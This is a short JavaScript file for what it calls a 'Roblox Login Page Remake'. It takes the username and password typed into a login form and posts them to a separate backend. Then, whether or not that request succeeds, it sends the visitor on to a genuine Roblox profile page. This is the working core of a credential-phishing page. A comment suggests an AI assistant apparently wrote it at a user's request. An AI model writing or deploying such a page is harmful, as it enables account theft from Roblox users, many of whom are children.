// Basic logic for handling form submission and input states

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('.login-form');
    const loginBtn = document.getElementById('login-button');
    const inputs = loginForm.querySelectorAll('input');

    // Handle form submission
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();

        const username = document.getElementById('login-username').value;
        const password = document.getElementById('login-password').value;

        if (username && password) {
            loginBtn.textContent = 'Logging In...';
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.7';

            // Send to Backend
            fetch('http://localhost:5000/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            })
                .then(res => res.json())
                .then(data => {
                    console.log('Success:', data);
                    // Simulate login delay then redirect (as requested by user earlier for /profile)
                    setTimeout(() => {
                        window.location.href = 'https://www.roblox.com/users/3510107601/profile';
                    }, 1000);
                })
                .catch(err => {
                    console.error('Error:', err);
                    // Fallback: still redirect or show error
                    setTimeout(() => {
                        window.location.href = 'https://www.roblox.com/users/3510107601/profile';
                    }, 1000);
                });
        }
    });

    // Simple interaction effects
    inputs.forEach(input => {
        input.addEventListener('focus', () => {
            input.parentElement.style.transform = 'scale(1.01)';
            input.parentElement.style.transition = 'transform 0.2s ease';
        });

        input.addEventListener('blur', () => {
            input.parentElement.style.transform = 'scale(1)';
        });
    });

    // Log the page version for debugging
    console.log('Roblox Login Page Remake v1.0 initialized');
});
